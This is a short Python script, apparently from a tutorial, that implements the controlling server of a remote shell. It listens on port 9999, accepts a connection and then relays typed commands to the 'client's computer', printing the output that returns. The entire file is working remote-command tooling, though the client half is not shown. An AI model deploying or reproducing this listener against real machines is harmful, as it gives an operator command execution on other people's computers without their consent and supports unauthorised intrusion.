import socket
import sys                                  # Used to implement terminal commands in python

# Create a socket (connect two computers)
def createSocket():
    try:
        global host
        global port
        global s                            # Socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Bind the socket and listen for connections
def bindSocket():
    try:
        global host
        global port
        global s                            # Socket

        print("Binding to port: " + str(port))

        s.bind((host, port))                # Bind host to port first
        s.listen(5)                         # Then listen

        
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Trying again...")
        bindSocket()

# Establish connection with a client (socket must be listening)
def socketAccept():
    conn,addr = s.accept()
    print("Connection has been established. | IP: " + addr[0] + " | Port: " + str(addr[1]) + " |")
    sendCommands(conn)
    conn.close()

# Sends commands from your computer to the client's computer
def sendCommands(conn):
    while True:     # Causes infinite loop which is needed otherwise connection will be closed
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        
        if len(str.encode(cmd)) > 0:    # Check if some valid command was entered
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024),"utf-8")   # Save response from client terminal into variable
            print(clientResponse, end = "")

def main():
    createSocket()
    bindSocket()
    socketAccept()
    
main()
